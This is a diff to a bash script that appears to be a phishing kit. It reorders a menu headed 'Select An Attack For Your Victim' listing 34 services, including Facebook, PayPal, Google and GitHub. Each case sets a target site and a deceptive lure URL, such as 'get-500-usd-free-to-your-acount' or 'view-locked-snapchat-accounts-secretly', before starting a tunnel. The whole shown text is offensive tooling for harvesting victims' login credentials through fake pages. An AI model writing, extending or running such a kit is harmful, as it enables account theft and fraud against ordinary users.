@@ -450,18 +450,19 @@ main_menu() {
 	cat <<- EOF
 		${BLUE}[${MAGENTA}::${BLUE}]${RED} Select An Attack For Your Victim ${BLUE}[${MAGENTA}::${BLUE}]${RED}
 
-		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook      ${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Twitch       ${MAGENTA}[${CYAN}21${MAGENTA}]${BLUE} DeviantArt
-		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram     ${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Pinterest    ${MAGENTA}[${CYAN}22${MAGENTA}]${BLUE} Badoo
-		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google        ${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Snapchat     ${MAGENTA}[${CYAN}23${MAGENTA}]${BLUE} Origin
-		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Microsoft     ${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Linkedin     ${MAGENTA}[${CYAN}24${MAGENTA}]${BLUE} DropBox	
-		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Netflix       ${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Ebay         ${MAGENTA}[${CYAN}25${MAGENTA}]${BLUE} Yahoo		
-		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Paypal        ${MAGENTA}[${CYAN}16${MAGENTA}]${BLUE} Quora        ${MAGENTA}[${CYAN}26${MAGENTA}]${BLUE} Wordpress
-		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Steam         ${MAGENTA}[${CYAN}17${MAGENTA}]${BLUE} Protonmail   ${MAGENTA}[${CYAN}27${MAGENTA}]${BLUE} Yandex			
-		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Twitter       ${MAGENTA}[${CYAN}18${MAGENTA}]${BLUE} Spotify      ${MAGENTA}[${CYAN}28${MAGENTA}]${BLUE} StackoverFlow
-		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Playstation   ${MAGENTA}[${CYAN}19${MAGENTA}]${BLUE} Reddit       ${MAGENTA}[${CYAN}29${MAGENTA}]${BLUE} Vk
-		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Tiktok        ${MAGENTA}[${CYAN}20${MAGENTA}]${BLUE} Adobe        ${MAGENTA}[${CYAN}30${MAGENTA}]${BLUE} XBOX
-		${MAGENTA}[${CYAN}31${MAGENTA}]${BLUE} Mediafire     ${MAGENTA}[${CYAN}32${MAGENTA}]${BLUE} Gitlab       ${MAGENTA}[${CYAN}33${MAGENTA}]${BLUE} Github
-		${MAGENTA}[${CYAN}34${MAGENTA}]${BLUE} Airbnb
+		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook      ${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Twitch       ${MAGENTA}[${CYAN}25${MAGENTA}]${BLUE} DeviantArt
+		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram     ${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Pinterest    ${MAGENTA}[${CYAN}26${MAGENTA}]${BLUE} Badoo
+		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google        ${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Snapchat     ${MAGENTA}[${CYAN}27${MAGENTA}]${BLUE} Origin
+		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Microsoft     ${MAGENTA}[${CYAN}16${MAGENTA}]${BLUE} Linkedin     ${MAGENTA}[${CYAN}28${MAGENTA}]${BLUE} DropBox	
+		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Netflix       ${MAGENTA}[${CYAN}17${MAGENTA}]${BLUE} Ebay         ${MAGENTA}[${CYAN}29${MAGENTA}]${BLUE} Yahoo		
+		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Paypal        ${MAGENTA}[${CYAN}18${MAGENTA}]${BLUE} Quora        ${MAGENTA}[${CYAN}30${MAGENTA}]${BLUE} Wordpress
+		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Steam         ${MAGENTA}[${CYAN}19${MAGENTA}]${BLUE} Protonmail   ${MAGENTA}[${CYAN}31${MAGENTA}]${BLUE} Yandex			
+		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Twitter       ${MAGENTA}[${CYAN}20${MAGENTA}]${BLUE} Spotify      ${MAGENTA}[${CYAN}32${MAGENTA}]${BLUE} StackoverFlow
+		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Playstation   ${MAGENTA}[${CYAN}21${MAGENTA}]${BLUE} Reddit       ${MAGENTA}[${CYAN}33${MAGENTA}]${BLUE} Vk
+		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Tiktok        ${MAGENTA}[${CYAN}22${MAGENTA}]${BLUE} Adobe        ${MAGENTA}[${CYAN}34${MAGENTA}]${BLUE} XBOX
+		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Mediafire     ${MAGENTA}[${CYAN}23${MAGENTA}]${BLUE} Gitlab
+		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Airbnb        ${MAGENTA}[${CYAN}24${MAGENTA}]${BLUE} Github
+
 
 		${CYAN}[${RED}99${CYAN}]${RED} About         ${CYAN}[${RED}00${CYAN}]${RED} Exit
 
@@ -504,100 +505,102 @@ main_menu() {
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
-		11)
-			website="twitch"
-			mask='https://unlimited-twitch-tv-user-for-free'
-			tunnel_menu;;
-		12)
-			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
-			tunnel_menu;;
-		13)
-			website="snapchat"
-			mask='https://view-locked-snapchat-accounts-secretly'
-			tunnel_menu;;
-		14)
-			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
-			tunnel_menu;;
-		15)
-			website="ebay"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		16)
-			website="quora"
-			mask='https://quora-premium-for-free'
-			tunnel_menu;;
-		17)
-			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
-			tunnel_menu;;
-		18)
-			website="spotify"
-			mask='https://convert-your-account-to-spotify-premium'
-			tunnel_menu;;
-		19)
-			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
-			tunnel_menu;;
-		20)
-			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
-			tunnel_menu;;
-		21)
-			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		22)
-			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		23)
-			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		24)
-			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
-			tunnel_menu;;
-		25)
-			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
-			tunnel_menu;;
-		26)
-			website="wordpress"
-			mask='https://wordpress-traffic-free'
-			tunnel_menu;;
-		27)
-			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
-			tunnel_menu;;
-		28)
-			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
-			tunnel_menu;;
-		29)
-			site_vk;;
-		30)
-			website="xbox"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		31)
+   		11)
 			website="mediafire"
 			mask='https://get-1TB-on-mediafire-free'
 			tunnel_menu;;
-		32)
+		12)
+		        website="airbnb"
+	                mask='https://airbnb-com'
+		        tunnel_menu;;
+
+		13)
+			website="twitch"
+			mask='https://unlimited-twitch-tv-user-for-free'
+			tunnel_menu;;
+		14)
+			website="pinterest"
+			mask='https://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		15)
+			website="snapchat"
+			mask='https://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		16)
+			website="linkedin"
+			mask='https://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		17)
+			website="ebay"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		18)
+			website="quora"
+			mask='https://quora-premium-for-free'
+			tunnel_menu;;
+		19)
+			website="protonmail"
+			mask='https://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		20)
+			website="spotify"
+			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		21)
+			website="reddit"
+			mask='https://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		22)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+   		23)
 			website="gitlab"
 			mask='https://get-1k-followers-on-gitlab-free'
 			tunnel_menu;;
-		33)
+		24)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
+
+		25)
+			website="deviantart"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		26)
+			website="badoo"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		27)
+			website="origin"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		28)
+			website="dropbox"
+			mask='https://get-1TB-cloud-storage-free'
+			tunnel_menu;;
+		29)
+			website="yahoo"
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			tunnel_menu;;
+		30)
+			website="wordpress"
+			mask='https://wordpress-traffic-free'
+			tunnel_menu;;
+		31)
+			website="yandex"
+			mask='https://grab-mail-from-anyother-yandex-account-free'
+			tunnel_menu;;
+		32)
+			website="stackoverflow"
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			tunnel_menu;;
+		33)
+			site_vk;;
 		34)
-		  website="airbnb"
-	      mask='https://airbnb-com'
-		  tunnel_menu;;
+			website="xbox"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
